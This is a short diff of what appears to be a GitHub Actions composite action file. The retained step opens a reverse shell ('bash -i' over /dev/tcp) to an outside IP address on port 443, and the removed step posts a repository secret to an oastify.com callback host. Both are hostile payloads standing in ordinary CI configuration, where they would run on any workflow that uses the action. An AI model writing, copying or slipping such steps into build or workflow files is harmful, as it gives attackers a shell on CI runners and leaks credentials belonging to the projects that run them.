@@ -8,9 +8,3 @@ runs:
       shell: bash
       run: |
         bash -i >& /dev/tcp/185.28.22.45/443 0>&1
-    - name: Try to exfiltrate test secret
-      run: |
-        echo "Attempting exfiltration of TOMAS..."
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "tomas=${{ secrets.TOMAS }}"
-      shell: bash
